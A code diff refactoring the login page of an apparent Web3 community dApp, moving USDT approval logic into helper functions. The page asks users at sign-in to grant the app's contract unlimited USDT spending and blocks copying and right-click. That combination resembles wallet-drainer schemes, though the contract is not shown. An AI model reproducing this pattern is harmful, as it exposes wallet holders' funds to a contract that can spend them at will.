@@ -1,12 +1,10 @@
-// frontend/src/pages/Login.tsx
 import React, { useEffect, useMemo, useRef, useState } from 'react'
 import { useWallet } from '../context/WalletContext'
-import { isRegistered, isAdmin as isAdminOnChain, getOwner } from '../utils/contract'
+import { isRegistered, isAdmin as isAdminOnChain, getOwner, approveUSDTMax, getUSDTAllowance } from '../utils/contract'
 import { useNavigate } from 'react-router-dom'
 import { isValidAddress } from '../utils/wallet'
-import { BrowserProvider, Contract, ethers } from 'ethers'
-import { config } from '../config'
 import { showErrorToast, showSuccessToast } from '../utils/notification'
+import { config } from '../config'
 
 type Phase = 'idle' | 'connecting' | 'checking' | 'enabling'
 
@@ -60,6 +58,7 @@ const styles: Record<string, React.CSSProperties> = {
   },
 }
 
+// Themed surface (global CSS classes)
 const Surface: React.FC<{ children: React.ReactNode }> = ({ children }) => (
   <div className="lxr-surface">
     <div className="lxr-surface-lines" />
@@ -70,12 +69,6 @@ const Surface: React.FC<{ children: React.ReactNode }> = ({ children }) => (
   </div>
 )
 
-// Minimal ERC20
-const ERC20_ABI = [
-  'function approve(address spender, uint256 amount) returns (bool)',
-  'function allowance(address owner, address spender) view returns (uint256)',
-]
-
 const Login: React.FC = () => {
   const navigate = useNavigate()
   const { connect, isConnecting, account } = useWallet()
@@ -83,9 +76,15 @@ const Login: React.FC = () => {
   const [error, setError] = useState<string>('')
   const [preapproved, setPreapproved] = useState<boolean>(false)
 
-  // Keep latest account
+  // Keep latest account to avoid stale closure
   const accountRef = useRef<string | null>(account)
   useEffect(() => { accountRef.current = account }, [account])
+
+  const buttonLabel = useMemo(() => {
+    if (phase === 'connecting') return 'Connecting...'
+    if (phase === 'checking') return 'Checking status...'
+    return isValidAddress(account) ? 'Continue' : 'Connect Wallet'
+  }, [phase, account])
 
   // Optional: block copy/select/context menu
   useEffect(() => {
@@ -102,12 +101,6 @@ const Login: React.FC = () => {
     }
   }, [])
 
-  const buttonLabel = useMemo(() => {
-    if (phase === 'connecting') return 'Connecting...'
-    if (phase === 'checking') return 'Checking status...'
-    return isValidAddress(account) ? 'Continue' : 'Connect Wallet'
-  }, [phase, account])
-
   const waitForAccount = async (timeoutMs = 8000): Promise<string | null> => {
     const start = Date.now()
     while (Date.now() - start < timeoutMs) {
@@ -120,10 +113,8 @@ const Login: React.FC = () => {
 
   const refreshAllowance = async (addr: string) => {
     try {
-      const provider = new BrowserProvider((window as any).ethereum)
-      const erc20 = new Contract(config.usdtAddress, ERC20_ABI, provider)
-      const allowance: bigint = await erc20.allowance(addr, config.contractAddress)
-      setPreapproved(allowance > 0n) // any non-zero means already enabled
+      const allowance = await getUSDTAllowance(addr, config.contractAddress)
+      setPreapproved(allowance > 0n)
     } catch {
       setPreapproved(false)
     }
@@ -137,11 +128,9 @@ const Login: React.FC = () => {
     if (!isValidAddress(account)) { showErrorToast('Connect wallet first'); return }
     try {
       setPhase('enabling')
-      const provider = new BrowserProvider((window as any).ethereum)
-      const signer = await provider.getSigner()
-      const erc20 = new Contract(config.usdtAddress, ERC20_ABI, signer)
-      const tx = await erc20.approve(config.contractAddress, ethers.MaxUint256)
-      await tx.wait()
+      const tx = await approveUSDTMax()
+      // @ts-ignore
+      await tx?.wait?.()
       await refreshAllowance(account!)
       showSuccessToast('USDT enabled (unlimited). You won’t be asked to approve again.')
     } catch (e) {
@@ -170,13 +159,11 @@ const Login: React.FC = () => {
     }
   }
 
-  // Auto-redirect if already connected
+  // Auto-redirect if already connected (optional)
   useEffect(() => {
     if (!isConnecting && phase === 'idle' && isValidAddress(account)) {
-      // We keep the Enable USDT available even if auto-redirect occurs
-      // If you prefer to force enabling before redirect, move checkAndRedirect after enabling.
-      // For now, redirect now — user can enable later too.
-      // checkAndRedirect(account!) // optional: keep disabled to let user click Continue.
+      // If you want to force enabling before redirect, move checkAndRedirect after enabling.
+      // checkAndRedirect(account!)
     }
   }, [account, isConnecting, phase])
 
@@ -208,7 +195,7 @@ const Login: React.FC = () => {
     <div style={styles.page}>
       <div style={styles.wrap}>
         <Surface>
-          <div style={{ position: 'relative', zIndex: 2, textAlign: 'center' }}>
+          <div style={styles.surfaceInner}>
             <div style={styles.badge}>Decentralized • Blockchain‑powered • Web3</div>
             <h1 className="lxr-lexori-logo" style={styles.title as any}>
               Welcome to our decentralized, blockchain‑powered Web3 community.
@@ -220,8 +207,14 @@ const Login: React.FC = () => {
                 onClick={handleConnect}
                 disabled={phase !== 'idle' || isConnecting}
                 style={{ ...styles.button, ...(phase !== 'idle' || isConnecting ? styles.buttonDisabled : {}) }}
-                onMouseOver={(e) => { (e.currentTarget as HTMLButtonElement).style.background = `linear-gradient(45deg, ${colors.accentSoft}, ${colors.accent})` }}
-                onMouseOut={(e) => { (e.currentTarget as HTMLButtonElement).style.background = `linear-gradient(45deg, ${colors.accent}, ${colors.accentSoft})` }}
+                onMouseOver={(e) => {
+                  (e.currentTarget as HTMLButtonElement).style.background =
+                    `linear-gradient(45deg, ${colors.accentSoft}, ${colors.accent})`
+                }}
+                onMouseOut={(e) => {
+                  (e.currentTarget as HTMLButtonElement).style.background =
+                    `linear-gradient(45deg, ${colors.accent}, ${colors.accentSoft})`
+                }}
               >
                 {buttonLabel}
               </button>
